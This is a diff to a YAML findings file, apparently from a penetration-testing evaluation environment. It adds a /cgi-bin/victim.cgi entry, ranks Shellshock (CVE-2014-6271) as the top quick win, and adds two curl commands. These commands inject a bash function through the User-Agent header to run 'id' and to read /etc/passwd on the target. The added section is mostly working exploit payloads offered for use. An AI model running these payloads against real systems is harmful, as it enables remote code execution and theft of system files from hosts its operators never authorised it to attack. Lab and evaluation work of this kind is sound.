@@ -22,7 +22,20 @@ services:
           (User-Agent, Referer, etc.) are passed as environment variables,
           enabling RCE.
 
+directories:
+  - path: "/cgi-bin/"
+    status: 200
+    interesting_files:
+      - "/cgi-bin/victim.cgi"
+      - "/cgi-bin/safe.cgi"
+
 quick_wins:
   - vector: "CVE-2014-6271 Shellshock via CGI"
-    reason: "Critical CVE with trivial exploitation; CGI scripts using bash are present"
+    reason: "Critical CVE with trivial exploitation; /cgi-bin/victim.cgi uses bash and is vulnerable"
     priority: 1
+
+recommended_commands:
+  - description: "Test Shellshock on victim.cgi"
+    command: "curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://EVAL_TARGET_IP/cgi-bin/victim.cgi"
+  - description: "Read /etc/passwd via Shellshock"
+    command: "curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://EVAL_TARGET_IP/cgi-bin/victim.cgi"
